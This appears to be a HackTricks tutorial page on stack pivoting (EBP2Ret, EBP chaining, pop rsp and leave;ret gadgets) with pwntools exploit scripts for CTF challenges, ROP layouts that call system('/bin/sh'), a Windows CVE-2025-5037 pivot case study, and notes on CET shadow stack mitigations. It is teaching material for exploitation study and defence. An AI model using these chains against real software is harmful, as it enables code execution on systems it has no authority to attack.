# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

This technique exploits the ability to manipulate the **Base Pointer (EBP/RBP)** to chain the execution of multiple functions through careful use of the frame pointer and the **`leave; ret`** instruction sequence.

As a reminder, on x86/x86-64 **`leave`** is equivalent to:

```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```

And as the saved **EBP/RBP is in the stack** before the saved EIP/RIP, it's possible to control it by controlling the stack.

> Notes
> - On 64-bit, replace EBP→RBP and ESP→RSP. Semantics are the same.
> - Some compilers omit the frame pointer (see “EBP might not be used”). In that case, `leave` might not appear and this technique won’t work.

### EBP2Ret

This technique is particularly useful when you can **alter the saved EBP/RBP but have no direct way to change EIP/RIP**. It leverages the function epilogue behavior.

If, during `fvuln`'s execution, you manage to inject a **fake EBP** in the stack that points to an area in memory where your shellcode/ROP chain address is located (plus 8 bytes on amd64 / 4 bytes on x86 to account for the `pop`), you can indirectly control RIP. As the function returns, `leave` sets RSP to the crafted location and the subsequent `pop rbp` decreases RSP, **effectively making it point to an address stored by the attacker there**. Then `ret` will use that address.

Note how you **need to know 2 addresses**: the address where ESP/RSP is going to go, and the value stored at that address that `ret` will consume.

#### Exploit Construction

First you need to know an **address where you can write arbitrary data/addresses**. RSP will point here and **consume the first `ret`**.

Then, you need to choose the address used by `ret` that will **transfer execution**. You could use:

- A valid [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.
- The address of **`system()`** followed by the appropriate return and arguments (on x86: `ret` target = `&system`, then 4 junk bytes, then `&"/bin/sh"`).
- The address of a **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) followed by inline shellcode.
- A [**ROP**](../rop-return-oriented-programing/index.html) chain staged in writable memory.

Remember that before any of these addresses in the controlled area, there must be **space for the `pop ebp/rbp`** from `leave` (8B on amd64, 4B on x86). You can abuse these bytes to set a **second fake EBP** and keep control after the first call returns.

#### Off-By-One Exploit

There's a variant used when you can **only modify the least significant byte of the saved EBP/RBP**. In such a case, the memory location storing the address to jump to with **`ret`** must share the first three/five bytes with the original EBP/RBP so a 1-byte overwrite can redirect it. Usually the low byte (offset 0x00) is increased to jump as far as possible within a nearby page/aligned region.

It’s also common to use a RET sled in the stack and put the real ROP chain at the end to make it more probable that the new RSP points inside the sled and the final ROP chain is executed.

### EBP Chaining

By placing a controlled address in the saved `EBP` slot of the stack and a `leave; ret` gadget in `EIP/RIP`, it's possible to **move `ESP/RSP` to an attacker-controlled address**.

Now `RSP` is controlled and the next instruction is `ret`. Place in the controlled memory something like:

- `&(next fake EBP)` -> Loaded by `pop ebp/rbp` from `leave`.
- `&system()` -> Called by `ret`.
- `&(leave;ret)` -> After `system` ends, moves RSP to the next fake EBP and continues.
- `&("/bin/sh")` -> Argument for `system`.

This way it's possible to chain several fake EBPs to control the flow of the program.

This is like a [ret2lib](../rop-return-oriented-programing/ret2lib/index.html), but more complex and only useful in edge-cases.

Moreover, here you have an [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) that uses this technique with a **stack leak** to call a winning function. This is the final payload from the page:

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
    0x0,               # rbp (could be the address of another fake RBP)
    POP_RDI,
    0xdeadbeef,
    POP_RSI_R15,
    0xdeadc0de,
    0x0,
    elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
    buffer,         # Load leaked address in RBP
    LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```

> amd64 alignment tip: System V ABI requires 16-byte stack alignment at call sites. If your chain calls functions like `system`, add an alignment gadget (e.g., `ret`, or `sub rsp, 8 ; ret`) before the call to maintain alignment and avoid `movaps` crashes.

## EBP might not be used

As [**explained in this post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), if a binary is compiled with some optimizations or with frame-pointer omission, the **EBP/RBP never controls ESP/RSP**. Therefore, any exploit working by controlling EBP/RBP will fail because the prologue/epilogue doesn’t restore from the frame pointer.

- Not optimized / frame pointer used:

```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```

- Optimized / frame pointer omitted:

```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```

On amd64 you’ll often see `pop rbp ; ret` instead of `leave ; ret`, but if the frame pointer is omitted entirely then there’s no `rbp`-based epilogue to pivot through.

## Other ways to control RSP

### `pop rsp` gadget

[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) you can find an example using this technique. For that challenge it was needed to call a function with 2 specific arguments, and there was a **`pop rsp` gadget** and there is a **leak from the stack**:

```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
    0,                 # r13
    0,                 # r14
    0,                 # r15
    POP_RDI,
    0xdeadbeef,
    POP_RSI_R15,
    0xdeadc0de,
    0x0,               # r15
    elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
    POP_CHAIN,
    buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```

### xchg <reg>, rsp gadget

```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```

### jmp esp

### Finding pivot gadgets quickly

Use your favorite gadget finder to search for classic pivot primitives:

- `leave ; ret` on functions or in libraries
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (or `add esp, <imm> ; ret` on x86)

Examples:

```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```

### Classic pivot staging pattern

A robust pivot strategy used in many CTFs/exploits:

1) Use a small initial overflow to call `read`/`recv` into a large writable region (e.g., `.bss`, heap, or mapped RW memory) and place a full ROP chain there.
2) Return into a pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) to move RSP to that region.
3) Continue with the staged chain (e.g., leak libc, call `mprotect`, then `read` shellcode, then jump to it).

### Windows: Destructor-loop weird-machine pivots (Revit RFA case study)

Client-side parsers sometimes implement destructor loops that indirectly call a function pointer derived from attacker-controlled object fields. If each iteration offers exactly one indirect call (a “one-gadget” machine), you can convert this into a reliable stack pivot and ROP entry.

Observed in Autodesk Revit RFA deserialization (CVE-2025-5037):

- Crafted objects of type `AString` place a pointer to attacker bytes at offset 0.
- The destructor loop effectively executes one gadget per object:

```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```

Two practical pivots:

- Windows 10 (32-bit heap addrs): misaligned “monster gadget” that contains `8B E0` → `mov esp, eax`, eventually `ret`, to pivot from the call primitive to a heap-based ROP chain.
- Windows 11 (full 64-bit addrs): use two objects to drive a constrained weird-machine pivot:
  - Gadget 1: `push rax ; pop rbp ; ret` (move original rax into rbp)
  - Gadget 2: `leave ; ... ; ret` (becomes `mov rsp, rbp ; pop rbp ; ret`), pivoting into the first object’s buffer, where a conventional ROP chain follows.

Tips for Windows x64 after the pivot:

- Respect the 0x20-byte shadow space and maintain 16-byte alignment before `call` sites. It’s often convenient to place literals above the return address and use a gadget like `lea rcx, [rsp+0x20] ; call rax` followed by `pop rax ; ret` to pass stack addresses without corrupting control flow.
- Non-ASLR helper modules (if present) provide stable gadget pools and imports such as `LoadLibraryW`/`GetProcAddress` to dynamically resolve targets like `ucrtbase!system`.
- Creating missing gadgets via a writable thunk: if a promising sequence ends in a `call` through a writable function pointer (e.g., DLL import thunk or function pointer in .data), overwrite that pointer with a benign single-step like `pop rax ; ret`. The sequence then behaves like it ended with `ret` (e.g., `mov rdx, rsi ; mov rcx, rdi ; ret`), which is invaluable to load Windows x64 arg registers without clobbering others.

## Modern mitigations that break stack pivoting (CET/Shadow Stack)

Modern x86 CPUs and OSes increasingly deploy **CET Shadow Stack (SHSTK)**. With SHSTK enabled, `ret` compares the return address on the normal stack with a hardware-protected shadow stack; any mismatch raises a Control-Protection fault and kills the process. Therefore, techniques like EBP2Ret/leave;ret-based pivots will crash as soon as the first `ret` is executed from a pivoted stack.

- For background and deeper details see:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Quick checks on Linux:

```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```

- Notes for labs/CTF:
  - Some modern distros enable SHSTK for CET-enabled binaries when hardware and glibc support is present. For controlled testing in VMs, SHSTK can be disabled system-wide via the kernel boot parameter `nousershstk`, or selectively enabled via glibc tunables during startup (see references). Don’t disable mitigations on production targets.
  - JOP/COOP or SROP-based techniques might still be viable on some targets, but SHSTK specifically breaks `ret`-based pivots.

- Windows note: Windows 10+ exposes user-mode and Windows 11 adds kernel-mode “Hardware-enforced Stack Protection” built on shadow stacks. CET-compatible processes prevent stack pivoting/ROP at `ret`; developers opt-in via CETCOMPAT and related policies (see reference).

## ARM64

In ARM64, the **prologue and epilogues** of the functions **don't store and retrieve the SP register** in the stack. Moreover, the **`RET`** instruction doesn't return to the address pointed by SP, but **to the address inside `x30`**.

Therefore, by default, just abusing the epilogue you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to control the SP you would still need a way to **control the `x30`** register.

- prologue

  ```armasm
  sub sp, sp, 16
  stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
  mov x29, sp             // FP points to frame record
  ```

- epilogue

  ```armasm
  ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
  add sp, sp, 16
  ret
  ```

> [!CAUTION]
> The way to perform something similar to stack pivoting in ARM64 would be to be able to **control the `SP`** (by controlling some register whose value is passed to `SP` or because for some reason `SP` is taking its address from the stack and we have an overflow) and then **abuse the epilogue** to load the **`x30`** register from a **controlled `SP`** and **`RET`** to it.

Also in the following page you can see the equivalent of **Ret2esp in ARM64**:
